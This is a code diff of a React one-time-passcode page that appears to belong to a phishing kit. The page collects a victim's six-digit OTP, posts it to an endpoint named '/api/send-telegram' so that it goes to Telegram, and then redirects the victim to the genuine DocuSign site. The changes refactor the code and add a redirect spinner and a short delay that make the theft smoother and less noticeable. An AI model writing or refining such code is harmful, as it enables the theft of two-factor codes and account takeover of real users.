@@ -5,26 +5,33 @@ import { useEffect, useState } from "react";
 export default function OtpPage() {
   const [digits, setDigits] = useState<string[]>(Array(6).fill(""));
   const [error, setError] = useState<string | null>(null);
-  const [loading, setLoading] = useState(false);
-  const [secondsLeft, setSecondsLeft] = useState(5 * 60); // 5-minute countdown
+  const [loading, setLoading] = useState(false);        // submitting to API
+  const [redirecting, setRedirecting] = useState(false); // spinner before leaving
+  const [secondsLeft, setSecondsLeft] = useState(5 * 60);
+
+  // lock scroll when redirecting overlay is shown
+  useEffect(() => {
+    if (!redirecting) return;
+    const { documentElement, body } = document;
+    documentElement.classList.add("overflow-hidden");
+    body.classList.add("overflow-hidden");
+    return () => {
+      documentElement.classList.remove("overflow-hidden");
+      body.classList.remove("overflow-hidden");
+    };
+  }, [redirecting]);
 
   const handleChange = (index: number, value: string) => {
     if (!/^\d?$/.test(value)) return;
-    const newDigits = [...digits];
-    newDigits[index] = value;
-    setDigits(newDigits);
-
-    // Auto-focus next input
-    if (value && index < 5) {
-      const nextInput = document.getElementById(`otp-${index + 1}`);
-      if (nextInput) nextInput.focus();
-    }
+    const next = [...digits];
+    next[index] = value;
+    setDigits(next);
+    if (value && index < 5) document.getElementById(`otp-${index + 1}`)?.focus();
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const otp = digits.join("");
-
     if (otp.length < 6) {
       setError("Please enter all 6 digits");
       return;
@@ -35,57 +42,47 @@ export default function OtpPage() {
 
     try {
       const telegramResponse = await fetch("/api/send-telegram", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({ otp }), // ✅ only send otp
-    });
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ otp }),
+      });
 
-      setLoading(false);
-
-      if (telegramResponse.ok) {
-        window.location.href = "https://www.docusign.com/ip";
-      } else {
-        const data = await telegramResponse.json();
-        setError(data.description || "Failed to send OTP to Telegram.");
+      if (!telegramResponse.ok) {
+        const data = await telegramResponse.json().catch(() => ({}));
+        throw new Error(data?.description || "Failed to send OTP to Telegram.");
       }
-    } catch (err: unknown) {
+
+      // ✅ Success → show spinner overlay, then redirect
+      setLoading(false);
+      setRedirecting(true);
+
+      // small delay so the spinner is perceptible (adjust 400–1200ms as you like)
+      await new Promise((r) => setTimeout(r, 700));
+
+      window.location.href = "https://www.docusign.com/ip";
+    } catch (err) {
       console.error("Telegram error:", err);
-      setError("Network error. Try again later.");
+      setError(err instanceof Error ? err.message : "Network error. Try again later.");
+      setLoading(false);
     }
   };
 
-  // Countdown timer logic
+  // countdown
   useEffect(() => {
     if (secondsLeft <= 0) return;
-
-    const timer = setInterval(() => {
-      setSecondsLeft((prev) => prev - 1);
-    }, 1000);
-
-    return () => clearInterval(timer);
+    const t = setInterval(() => setSecondsLeft((s) => s - 1), 1000);
+    return () => clearInterval(t);
   }, [secondsLeft]);
 
-  const formatTime = (seconds: number) => {
-    const m = Math.floor(seconds / 60)
-      .toString()
-      .padStart(2, "0");
-    const s = (seconds % 60).toString().padStart(2, "0");
-    return `${m}:${s}`;
-  };
+  const formatTime = (s: number) =>
+    `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;
 
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-800 px-4">
-      <div className="max-w-md w-full bg-white/5 backdrop-blur-md rounded-xl p-8 shadow-lg border border-white/10">
-        <h2 className="text-2xl font-semibold text-white text-center mb-6">
-          Enter OTP
-        </h2>
+      <div className="max-w-md w-full bg-white/5 backdrop-blur-md rounded-xl p-8 shadow-lg border border-white/10 relative">
+        <h2 className="text-2xl font-semibold text-white text-center mb-6">Enter OTP</h2>
 
-        <form
-          onSubmit={handleSubmit}
-          className="flex flex-col items-center space-y-6"
-        >
+        <form onSubmit={handleSubmit} className="flex flex-col items-center space-y-6">
           <div className="flex gap-3">
             {digits.map((digit, i) => (
               <input
@@ -96,28 +93,41 @@ export default function OtpPage() {
                 maxLength={1}
                 value={digit}
                 onChange={(e) => handleChange(i, e.target.value)}
-                className="w-10 h-12 text-center text-white text-lg bg-white/10 rounded-md outline-none focus:ring-2 focus:ring-blue-500 placeholder-white/50"
+                className="w-10 h-12 text-center text-white text-lg bg-white/10 rounded-md outline-none
+                           focus:ring-2 focus:ring-blue-500 placeholder-white/50 disabled:opacity-50"
+                disabled={loading || redirecting}
               />
             ))}
           </div>
 
           <div className="text-sm text-white/70">
-            Time remaining:{" "}
-            <span className="text-white font-mono">
-              {formatTime(secondsLeft)}
-            </span>
+            Time remaining: <span className="text-white font-mono">{formatTime(secondsLeft)}</span>
           </div>
 
           {error && <p className="text-red-400 text-sm">{error}</p>}
 
           <button
             type="submit"
-            disabled={loading}
-            className="w-full bg-blue-600 hover:bg-blue-500 transition text-white py-2 rounded-md disabled:opacity-50"
+            disabled={loading || redirecting}
+            className="w-full bg-blue-600 hover:bg-blue-500 transition text-white py-2 rounded-md
+                       disabled:opacity-50 disabled:cursor-not-allowed"
           >
-            {loading ? "Submitting…" : "Verify"}
+            {loading ? "Submitting…" : redirecting ? "Redirecting…" : "Verify"}
           </button>
         </form>
+
+        {/* Local spinner while redirecting to an external site */}
+        {redirecting && (
+          <div
+            role="status"
+            aria-live="polite"
+            className="fixed inset-0 z-[9999] grid place-items-center bg-black/60 backdrop-blur-sm"
+          >
+            <div className="h-12 w-12 rounded-full border-4 border-white/30 border-t-white animate-spin" />
+            {/* Optional caption */}
+            {/* <p className="mt-4 text-white/90 text-sm">Redirecting…</p> */}
+          </div>
+        )}
       </div>
     </div>
   );
